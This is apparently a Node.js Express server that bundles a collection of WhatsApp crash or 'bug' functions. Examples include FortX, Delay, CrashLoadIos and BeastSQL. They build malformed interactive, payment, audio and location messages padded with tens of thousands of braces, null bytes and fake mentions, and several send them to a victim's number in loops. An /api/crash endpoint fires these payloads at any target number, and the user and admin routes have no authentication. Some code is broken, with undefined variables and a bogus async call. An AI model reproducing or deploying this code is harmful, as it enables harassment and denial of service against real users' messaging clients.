const express = require("express");
const fs = require("fs");
const crypto = require("crypto");
const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.json());
app.use(express.static("public"));

const loadUsers = () => JSON.parse(fs.readFileSync("./users.json", "utf8"));
const saveUsers = (data) => fs.writeFileSync("./users.json", JSON.stringify(data, null, 2));

app.post("/api/add-user", (req, res) => {
  const { phone, role } = req.body;
  const users = loadUsers();
  users.push({ phone, role });
  saveUsers(users);
  res.json({ success: true, message: "User added." });
});

app.post("/api/add-admin", (req, res) => {
  const { phone } = req.body;
  const users = loadUsers();
  users.push({ phone, role: "admin" });
  saveUsers(users);
  res.json({ success: true, message: "Admin added." });
});

app.post("/api/change-role", (req, res) => {
  const { phone, newRole } = req.body;
  const users = loadUsers();
  const user = users.find(u => u.phone === phone);
  if (user) {
    user.role = newRole;
    saveUsers(users);
    res.json({ success: true, message: "Role updated." });
  } else {
    res.status(404).json({ success: false, message: "User not found." });
  }
});

// TARO FUNCTIONMY
async function FortX(target) {
  try {
    let msg = await generateWAMessageFromContent(
      target,
      {
        interactiveMessage: {
          header: {
            title: "",
          },
          hasMediaAttachment: true,
        },
        body: {
          text: "{ Trex Forxture }",
        },
        footer: {
          text: "",
        },
        nativeFlowMessage: {
          buttons: [
            {
              name: "payment_currency",
              buttonParamsJson: "",
            },
            {
              name: "payment_method",
              buttonParamsJson: "{\"currency\":\"XXX\",\"payment_configuration\":\"\",\"payment_type\":\"\",\"total_amount\":{\"value\":1000000,\"offset\":100},\"reference_id\":\"4SWMDTS1PY4\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"description\":\"\",\"subtotal\":{\"value\":0,\"offset\":100},\"order_type\":\"PAYMENT_REQUEST\",\"items\":[{\"retailer_id\":\"custom-item-6bc19ce3-67a4-4280-ba13-ef8366014e9b\",\"name\":\"{ Zynzz Attack }\",\"amount\":{\"value\":1000000,\"offset\":100},\"quantity\":1}]},\"additional_note\":\"{ Zynzz Attack }\",\"native_payment_methods\":[],\"share_payment_status\":false}"
            }
          ],
          messageParamsJson: "{".repeat(10000),
        },
      },
    );

    await sock.relayMessage(target, msg.message, {
      participant: { jid: target },
    });
  } catch (err) {
    console.log(err);
  }
}

async function StupidSql(jid) {
  const header = {
    videoMessage: media.videoMessage,
    hasMediaAttachment: false,
    contextInfo: {
      forwardingScore: 666,
      isForwarded: true,
      stanzaId: "" + Date.now(),
      participant: "0@s.whatsapp.net",
      remoteJid: "status@broadcast",
      quotedMessage: {
        extendedTextMessage: {
          text: "YOU STUPID?😹",
          contextInfo: {
            mentionedJid: ["13135550002@s.whatsapp.net"],
            externalAdReply: {
              title: "",
              body: "",
              thumbnailUrl: "",
              mediaType: 1,
              sourceUrl: "t.me/functionBug",
              showAdAttribution: false
            }
          }
        }
      }
    }
  };

  for (let i = 0; i < 10; i++) {
    cards.push({
      header,
      nativeFlowMessage: {
        messageParamsJson: "{".repeat(10000) 
      }
    });
  }

  const msg = generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            body: {
              text: ""
            },
            carouselMessage: {
              cards,
              messageVersion: 1
            },
            contextInfo: {
              businessMessageForwardInfo: {
                businessOwnerJid: "13135550002@s.whatsapp.net"
              },
              stanzaId: "" + "" + Math.floor(Math.random() * 99999), 
              forwardingScore: 100,
              isForwarded: true,
              mentionedJid: ["13135550002@s.whatsapp.net"],
              externalAdReply: {
                title: "",
                body: "",
                thumbnailUrl: "https://example.com/Verse",
                mediaType: 1,
                mediaUrl: "",
                sourceUrl: "https://t.me/VerseNotDev",
                showAdAttribution: false
              }
            }
          }
        }
      }
    },
    {}
  );

  await stupid.relayMessage(target, msg.message, {
    participant: { jid: target },
    messageId: msg.key.id
  });
}

async function XqR(target) {
  const msg = {
    interactiveMessage: {
      header: {
        locationMessage: {
          degreesLatitude: 0,
          degreesLongitude: 0,
        },
        body: {
          text: "{ Fortune X }",
        },
        contextInfo: {
          mentionedJid: [target],
          isForwarded: true,
          forwardingScore: 9999999,
          businessMessageForwardInfo: {
            businessOwnerJid: target,
          },
        },
        nativeFlowMessage: {
          messageParamsJson: "{".repeat(15000),
          buttons: [
            {
             name: "payment_method",
             buttonParamsJson: "{\"currency\":\"XXX\",\"payment_configuration\":\"\",\"payment_type\":\"\",\"total_amount\":{\"value\":1000000,\"offset\":100},\"reference_id\":\"4SWMDTS1PY4\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"description\":\"\",\"subtotal\":{\"value\":0,\"offset\":100},\"order_type\":\"PAYMENT_REQUEST\",\"items\":[{\"retailer_id\":\"custom-item-6bc19ce3-67a4-4280-ba13-ef8366014e9b\",\"name\":\"{ Zynzz Attack }\",\"amount\":{\"value\":1000000,\"offset\":100},\"quantity\":1}]},\"additional_note\":\"{ Zynzz Attack }\",\"native_payment_methods\":[],\"share_payment_status\":false}"
           },
         ],
       },
     }
   }
 }
 
 await sock.relayMessage(target, msg.message, {
   participant: { jid: target },
   messageId: msg.key.id,
  });
}

async function qPay(target) {
  let whyyou = generateWAMessageFromContent(target, {
    interactiveMessage: {
      contextInfo: {
        isForwarded: true, 
        forwardingScore: 1972,
        businessMessageForwardInfo: {
          businessOwnerJid: "13135550002@s.whatsapp.net"
        }, 
        participant: "13135550002@s.whatsapp.net", 
        remoteJid: "status@broadcast", 
        quotedMessage: {
          paymentInviteMessage: {
            serviceType: "UPI", 
            expiryTimestamp: Date.now()
          }
        }
      }, 
      header: {
        hasMediaAttachment: false, 
        title: "D | 7eppeli-Exploration"
      }, 
      nativeFlowMessage: {
        buttons: [
          {
            name: "single_select",
            buttonParamsJson: JSON.stringify({
              title: "\u0000".repeat(9000), 
              sections: [
                {
                  title: "\u0000", 
                  rows: []
                }
              ]
            })
          }
        ]
      }, 
    }
  }, { userJid:target });
  
  await Yuukey.relayMessage(target, whyyou.message, {
    participant: { jid:target }, 
    messageId: whyyou.key.id
  })
}

async function FrezeXblank(sock, jid) {
try {
  const videoPayload = await prepareWAMessageMedia({
    video: { url: "https://files.catbox.moe/74v4yo.mp4", gifPlayback: true }
  }, {
    upload: sock.waUploadToServer,
    mediaType: "video"
  })
  for (let i = 0; i < 100; i++) {
    const msg = generateWAMessageFromContent(jid, proto.Message.fromObject({
      interactiveMessage: {
        contextInfo: {
          mentionedJid: [jid],
          forwardedNewsletterMessageInfo: {
            newsletterJid: "120363399013145023@newsletter",
            newsletterName: "✦",
            serverMessageId: 1
          }
        },
        header: {
          title: "",
          ...videoPayload,
          hasMediaAttachment: true
        },
        body: { text: "Hama" },
        footer: { text: "" },
        nativeFlowMessage: {
          buttons: [
            {
              name: "single_select",
              buttonParamsJson: `{"title":"${"ꦾ".repeat(10000)}","sections":[{"title":"Crash","rows":[]}]}`
            },
            {
              name: "address_message",
              buttonParamsJson: JSON.stringify({
                "screen_1_TextInput_0": "radio - buttons" + "\u0000".repeat(10000),
                "screen_0_Dropdown_1":  "\u0000".repeat(10000),
                "flow_token": "AQAAAAACS5FpgQ_cAAAAAE0QI3s."
              }),
              version: 3
            }
          ]
        }
      }
    }), { userJid: jid })
    await sock.relayMessage(target, msg.message, { messageId: msg.key.id })
  }
} catch (err) {
      console.error(err);
 }
console.log(chalk.red(`Success Sent Bug To ${jid}`))
}

async function FolwareLite03(target, mention) {
  const AudioVs = {
    message: {
      ephemeralMessage: {
        message: {
          audioMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc?ccb=11-4&oh=01_Q5AaINRqU0f68tTXDJq5XQsBL2xxRYpxyF4OFaO07XtNBIUJ&oe=67C0E49E&_nc_sid=5e03e0&mms3=true",
            mimetype: "audio/mpeg",
            fileSha256: "ON2s5kStl314oErh7VSStoyN8U6UyvobDFd567H+1t0=",
            fileLength: 99999999999999,
            seconds: 99999999999999,
            ptt: true,
            mediaKey: "+3Tg4JG4y5SyCh9zEZcsWnk8yddaGEAL/8gFJGC7jGE=",
            fileEncSha256: "iMFUzYKVzimBad6DMeux2UO10zKSZdFg9PkvRtiL4zw=",
            directPath: "/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc?ccb=11-4&oh=01_Q5AaINRqU0f68tTXDJq5XQsBL2xxRYpxyF4OFaO07XtNBIUJ&oe=67C0E49E&_nc_sid=5e03e0",
            mediaKeyTimestamp: 99999999999999,
            contextInfo: {
              mentionedJid: [
                "@s.whatsapp.net",
                ...Array.from({ length: 1900 }, () =>
                  `1${Math.floor(Math.random() * 90000000)}@s.whatsapp.net`
                )
              ],
              isForwarded: true,
              forwardedNewsletterMessageInfo: {
                newsletterJid: "120363375427625764@newsletter",
                serverMessageId: 1,
                newsletterName: "Traz Invictus🌹"
              }
            },
            waveform: "AAAAIRseCVtcWlxeW1VdXVhZDB09SDVNTEVLW0QJEj1JRk9GRys3FA8AHlpfXV9eL0BXL1MnPhw+DBBcLU9NGg=="
          }
        }
      }
    }
  };

  const msg = generateWAMessageFromContent(target, AudioVs.message, { userJid: target });

  await sock.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              { tag: "to", attrs: { jid: target }, content: undefined }
            ]
          }
        ]
      }
    ]
  });

  if (mention) {
    await sock.relayMessage(target, {
      groupStatusMentionMessage: {
        message: {
          protocolMessage: {
            key: msg.key,
            type: 25
          }
        }
      }
    }, {
      additionalNodes: [{
        tag: "meta",
        attrs: {
          is_status_mention: "Kipop Is Here"
        },
        content: undefined
      }]
    });
  }
}

async function Delay(sock, target) {
  try {
    const mentions40k = Array.from({ length: 40000 }, (_, i) => `${i}@s.whatsapp.net`);
    const mentions16k = Array.from({ length: 1600 }, () => `${Math.floor(1e11 + Math.random() * 9e11)}@s.whatsapp.net`);
    const corruptedJson = "{".repeat(500000);
    const glitchJson = "{".repeat(5000) + "[".repeat(5000);
    const callParams = "꧔꧈".repeat(9000);

    const fakeImage = {
      mimetype: "image/jpeg",
      caption: "",
      fileLength: "9999999999999",
      fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
      fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
      mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
      height: 1,
      width: 1,
      jpegThumbnail: Buffer.from("").toString("base64"),
      contextInfo: {
        mentionedJid: mentions40k,
        forwardingScore: 9999,
        isForwarded: true,
        participant: "0@s.whatsapp.net"
      }
    };

    for (let i = 0; i < 999999; i++) {
      const comboPayload = {
        viewOnceMessage: {
          message: {
            conversation: "\u2063".repeat(1000),
            imageMessage: fakeImage,
            interactiveMessage: {
              header: {
                title: " ".repeat(6000),
                hasMediaAttachment: false,
                locationMessage: {
                  degreesLatitude: -999,
                  degreesLongitude: 999,
                  name: corruptedJson.slice(0, 100),
                  address: corruptedJson.slice(0, 100)
                }
              },
              body: { text: "⟅ ༑ ▾𝐀𝐗𝐆𝐀𝐍𝐊 • 𝐗-𝐂𝐎𝐑𝐄⟅ ༑ ▾" },
              footer: { text: "🩸 ༑ 𝐀𝐗𝐆𝐀𝐍𝐊 炎 𝐈𝐍𝐕𝐈𝐂𝐓𝐔𝐒⟅ ༑ 🩸" },
              nativeFlowMessage: { messageParamsJson: corruptedJson },
              contextInfo: {
                mentionedJid: mentions40k,
                forwardingScore: 9999,
                isForwarded: true,
                participant: "0@s.whatsapp.net"
              }
            },
            contextInfo: {
              externalAdReply: {
                title: "𝐀𝐗𝐆𝐀𝐍𝐊 𝐈𝐍𝐕𝐈𝐂𝐓𝐔𝐒",
                body: "Delay Combo Invictus",
                thumbnailUrl: "https://files.catbox.moe/nuotqm.jpg",
                mediaType: 1,
                sourceUrl: "https://t.me/LuciferNotDev",
                showAdAttribution: false
              },
              mentionedJid: mentions16k
            },
            interactiveResponseMessage: {
              body: {
                text: "🩸 ༑ 𝐀𝐗𝐆𝐀𝐍𝐊 炎 𝐈𝐍𝐕𝐈𝐂𝐓𝐔𝐒⟅ ༑ 🩸",
                format: "DEFAULT"
              },
              nativeFlowResponseMessage: {
                name: "call_permission_request",
                paramsJson: callParams,
                version: 3
              }
            }
          }
        },
        nativeFlowMessage: {
          name: "call_permission_request",
          messageParamsJson: glitchJson,
          status: true,
          cameraAccess: true
        }
      };

      const msg = await generateWAMessageFromContent(target, comboPayload, {});
      await new Promise(resolve => setTimeout(resolve, 300));

      await sock.relayMessage(target, msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [{
          tag: "meta",
          attrs: {},
          content: [{
            tag: "mentioned_users",
            attrs: {},
            content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
          }]
        }]
      });

      await sock.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [{
          tag: "meta",
          attrs: {},
          content: [{
            tag: "mentioned_users",
            attrs: {},
            content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
          }]
        }]
      });
    }

    console.log("Delay Send to target");
  } catch (err) {
    console.error("❌ Error in Delay:", err);
  }
}

async function ZynPrivateFunc(target) {
  const msg = {
    interactiveMessage: {
      header: {
        title: "ꦾ".repeat(9999),
      },
      hasMediaAttachment: true,
    },
    body: {
      text: "𝚉𝚢𝚗𝚣𝚣 𝙲𝚛𝚊𝚜𝚑 𝚃𝚎𝚊𝚖 💥" + "ꦾ".repeat(20000),
    },
    nativeFlowMessage: {
      buttons: [
        { name: "single_select", buttonParamsJson: "{".repeat(50000) },
        { name: "single_select", buttonParamsJson: "{".repeat(50000) },
        { name: "single_select", buttonParamsJson: "{".repeat(50000) },
        { name: "single_select", buttonParamsJson: "{".repeat(50000) },
        { name: "single_select", buttonParamsJson: "{".repeat(50000) },
        { name: "payment_currency", buttonParamsJson: "-{}-".repeat(25000) },
        { name: "payment_currency", buttonParamsJson: "-{}-".repeat(25000) },
        { name: "payment_currency", buttonParamsJson: "-{}-".repeat(25000) },
        { name: "payment_currency", buttonParamsJson: "-{}-".repeat(25000) },
        { name: "payment_currency", buttonParamsJson: "-{}-".repeat(25000) },
      ],
    },
    messageParamsJson: "{".repeat(35000),
  };

  await sock.relayMessage(target, msg, {
    participant: { jid: target },
    messageId: msg.key.id,
  });
  console.log(chalk.red(`Succes Send Message To ${target}`));
}

async function blankDelayMp3(target, mention = false) {
    console.log(chalk.blue(`Succes Sending Bug To Target ${target}`));

    const mentionedList = [
        "13135550002@s.whatsapp.net",
        ...Array.from({ length: 1950 }, () =>
            `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
        )
    ];
    const embeddedMusic = {
        musicContentMediaId: "589608164114571",
        songId: "870166291800508",
        author: ".MP3 HERE BROO" + "ោ៝".repeat(10000),
        title: "Finix",
        artworkDirectPath: "/v/t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc",
        artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
        artworkEncSha256: "iWv+EkeFzJ6WFbpSASSbK5MzajC+xZFDHPyPEQNHy7Q=",
        artistAttribution: "https://www.instagram.com/_u/tamainfinity_",
        countryBlocklist: true,
        isExplicit: true,
        artworkMediaKey: "S18+VRv7tkdoMMKDYSFYzcBx4NCM3wPbQh+md6sWzBU="
    };

    const videoMessage = {
        url: "https://mmg.whatsapp.net/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc",
        mimetype: "video/mp4",
        fileSha256: "c8v71fhGCrfvudSnHxErIQ70A2O6NHho+gF7vDCa4yg=",
        fileLength: "289511",
        seconds: 15,
        mediaKey: "IPr7TiyaCXwVqrop2PQr8Iq2T4u7PuT7KCf2sYBiTlo=",
        caption: "OverloadSystem",
        height: 640,
        width: 640,
        fileEncSha256: "BqKqPuJgpjuNo21TwEShvY4amaIKEvi+wXdIidMtzOg=",
        directPath: "/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc",
        mediaKeyTimestamp: "1743848703",
        contextInfo: {
            isSampled: true,
            mentionedJid: mentionedList
        },
        forwardedNewsletterMessageInfo: {
            newsletterJid: "120363321780343299@newsletter",
            serverMessageId: 1,
            newsletterName: " salah kok gamau ngaku salah "
        },
        streamingSidecar: "cbaMpE17LNVxkuCq/6/ZofAwLku1AEL48YU8VxPn1DOFYA7/KdVgQx+OFfG5OKdLKPM=",
        thumbnailDirectPath: "/v/t62.36147-24/11917688_1034491142075778_3936503580307762255_n.enc",
        thumbnailSha256: "QAQQTjDgYrbtyTHUYJq39qsTLzPrU2Qi9c9npEdTlD4=",
        thumbnailEncSha256: "fHnM2MvHNRI6xC7RnAldcyShGE5qiGI8UHy6ieNnT1k=",
        annotations: [
            {
                embeddedContent: {
                    embeddedMusic
                },
                embeddedAction: true
            }
        ]
    };

    const audioMessagePayload = {
        viewOnceMessage: {
            message: {
                audioMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7114-24/25481244_734951922191686_4223583314642350832_n.enc",
                    mimetype: "audio/mpeg",
                    fileSha256: Buffer.from([
                        226, 213, 217, 102, 205, 126, 232, 145, 0, 70, 137, 73, 190, 145, 0,
                        44, 165, 102, 153, 233, 111, 114, 69, 10, 55, 61, 186, 131, 245,
                        153, 93, 211
                    ]),
                    fileLength: 432722,
                    seconds: 20,
                    ptt: false,
                    mediaKey: Buffer.from([
                        182, 141, 235, 167, 91, 254, 75, 254, 190, 229, 25, 16, 78, 48, 98,
                        117, 42, 71, 65, 199, 10, 164, 16, 57, 189, 229, 54, 93, 69, 6, 212,
                        145
                    ]),
                    fileEncSha256: Buffer.from([
                        29, 27, 247, 158, 114, 50, 140, 73, 40, 108, 77, 206, 2, 12, 84,
                        131, 54, 42, 63, 11, 46, 208, 136, 131, 224, 87, 18, 220, 254, 211,
                        83, 153
                    ]),
                    directPath:
                        "/v/t62.7114-24/25481244_734951922191686_4223583314642350832_n.enc",
                    mediaKeyTimestamp: 1746275400,
                    contextInfo: {
                        mentionedJid: Array.from({ length: 30000 }, () =>
                            "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"
                        ),
                        isSampled: true,
                        participant: target,
                        remoteJid: "status@broadcast",
                        forwardingScore: 9741,
                        isForwarded: true
                    }
                }
            }
        }
    };

    const msgAudio = generateWAMessageFromContent(target, audioMessagePayload, {});
    await sock.relayMessage("status@broadcast", msgAudio.message, {
        messageId: msgAudio.key.id,
        statusJidList: [target]
    });

    const msgVideo = generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: { videoMessage }
        }
    }, {});
    await sock.relayMessage("status@broadcast", msgVideo.message, {
        messageId: msgVideo.key.id,
        statusJidList: [target]
    });

    if (mention) {
        await sock.relayMessage(target, {
            statusMentionMessage: {
                message: {
                    protocolMessage: {
                        key: msgVideo.key,
                        type: 25
                    }
                }
            }
        }, {});
    }

    console.log(chalk.green(`blankDelayMp3 Completed for ${target}`));
}

async function EmpireUltimate(target) {
  for (let i = 0; i < 15; i++) {
    const msg = await generateWAMessageFromContent(
      target,
      {
        viewOnceMessage: {
          message: {
            interactiveMessage: {
              header: {
                title: "",
                hasMediaAttachment: false,
                liveLocationMessage: {
                  degreesLatitude: -999.035,
                  degreesLongitude: 922.9999,
                  name: "Matrix",
                  address: "Matrix"
                }
              },
              body: {
                text: "( 👾 ) AcistàMatr¡x505¿"
              },
              nativeFlowMessage: {
                messageParamsJson: "{".repeat(10000),
                buttons: [
                  {
                    name: "single_select",
                    buttonParamsJson: "\u0000".repeat(999)
                  },
                  {
                    name: "call_permission_request",
                    buttonParamsJson: "\u0000".repeat(999)
                  },
                  {
                    name: "mpm",
                    buttonParamsJson: "\u0000".repeat(999)
                  },
                  {
     name: "payment_status",
     buttonParamsJson: "\u0003"
       },
                ]
              },
              contextInfo: {
                remoteJid: "status@broadcast",
                participant: target,
                forwardingScore: 250208,
                isForwarded: false,
                mentionedJid: [target, "13135550002@s.whatsapp.net"]
              },
              quotedMessage: {
                paymentInviteMessage: {
                  serviceType: 1,
                  expiryTimestamp: null
                }
              }
            }
          }
        }
      },
      {}
    );

    await Empire.relayMessage(target, msg.message, {
      participant: { jid: target },
      messageId: msg.key.id
    });
console.log("EtteckTic Force")
  }
}

async function BeastSQL(Noct, target) {
    const contextInfo = {
        participant: target,
        remoteJid: "X",
        participant: Math.floor(Math.random() * 5000000) + "@s.whatsapp.net",
        stanzaId: "12345678",
        quotedMessage: {
            paymentInviteMessage: {
                serviceType: 3,
                expiryTimestamp: Date.now() + 1814400000
            },
            forwardedAiBotMessageInfo: {
                botName: "Meta AI",
                botJid: Math.floor(Math.random() * 5000000) + "@s.whatsapp.net",
                creatorName: "AI"
            }
        }
    };

 const Interactive = {
  viewOnceMessage: {
    message: {
      interactiveMessage: {
        contextInfo: {
        stanzaId: "CRASH" + "X".repeat(10000),
          quotedMessage: {
            conversation: "CRASH".repeat(50000)
            }
            },
        carouselMessage: {
          messageVersion: 1,
          cards: [
            {
              header: { hasMediaAttachment: true, imageMessage: "https://github.com/Joodev65.png" }, 
              body: { text: "JooMod4sss - Verse\n\nꦾ".repeat(1000) },
              nativeFlowMessage: {
                messageParamsJson: "{}".repeat(10000), 
                buttons: [
                  {
                    name: "payment_method",
                    buttonParamsJson: "{\"currency\":\"IDR\",\"total_amount\":{\"value\":1000000,\"offset\":100},\"reference_id\":\"JooModder\",\"type\":\"physical-goods\",\"order\":{\"status\":\"canceled\",\"subtotal\":{\"value\":0,\"offset\":100},\"order_type\":\"PAYMENT_REQUEST\",\"items\":[{\"retailer_id\":\"custom-item-6bc19ce3-67a4-4280-ba13-ef8366014e9b\",\"name\":\"JooModder\",\"amount\":{\"value\":1000000,\"offset\":100},\"quantity\":1000}]},\"additional_note\":\"JooModder\",\"native_payment_methods\":[],\"share_payment_status\":true}"
                  },
                  {
                    name: "review_and_pay",
                    buttonParamsJson: "{\"currency\":\"XXX\",\"payment_configuration\":\"\",\"payment_type\":\"\",\"total_amount\":{\"value\":1000000,\"offset\":100},\"reference_id\":\"4SWMDTS1PY4\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"description\":\"\",\"subtotal\":{\"value\":0,\"offset\":100},\"order_type\":\"PAYMENT_REQUEST\",\"items\":[{\"retailer_id\":\"custom-item-6bc19ce3-67a4-4280-ba13-ef8366014e9b\",\"name\":\"X - JooModss\",\"amount\":{\"value\":1000000,\"offset\":100},\"quantity\":1}]},\"additional_note\":\"X - JooModss\",\"native_payment_methods\":[],\"share_payment_status\":true}"
                  }
                ]
              }
            }
          ]
        }
      }
    }
  }
};


    await Noct.relayMessage(target, Interactive, {
        messageId: "msg-" + Date.now(),
        userJid: target
    });
}

async function CrashLoadIos(sock, target) {
  const LocationMessage = {
    locationMessage: {
      degreesLatitude: 21.1266,
      degreesLongitude: -11.8199,
      name: " ⎋𝐑𝐈̸̷̷̷̋͜͢͜͢͠͡͡𝐙𝐗𝐕𝐄𝐋𝐙͜͢-‣꙱\n" + "\u0000".repeat(60000) + "𑇂𑆵𑆴𑆿".repeat(60000),
      url: "https://t.me/rizxvelzdev",
      contextInfo: {
        externalAdReply: {
          quotedAd: {
            advertiserName: "𑇂𑆵𑆴𑆿".repeat(60000),
            mediaType: "IMAGE",
            jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/",
            caption: "@rizxvelzinfinity" + "𑇂𑆵𑆴𑆿".repeat(60000)
          },
          placeholderKey: {
            remoteJid: "0s.whatsapp.net",
            fromMe: false,
            id: "ABCDEF1234567890"
          }
        }
      }
    }
  };

  await sock.relayMessage(target, LocationMessage, {
    participant: { jid: target }
  });
  console.log(randomColor()(`─────「 ⏤!CrashIOS To: ${target}!⏤ 」─────`))
}

//BATES FUNCTION 

app.post("/api/crash", async (req, res) => {
  const { target } = req.body;
  if (!target) {
    return res.status(400).json({ success: false, message: "Target number is required." });
  }

  try {
    await async(target, {}); // Dummy sock untuk testing lokal //InvisibleHome ubah ke nama asyn functionnya
    res.json({ success: true, message: `Bug terkirim ke ${target}` });
  } catch (err) {
    res.status(500).json({ success: false, message: "Gagal kirim bug", error: err.message });
  }
});

app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
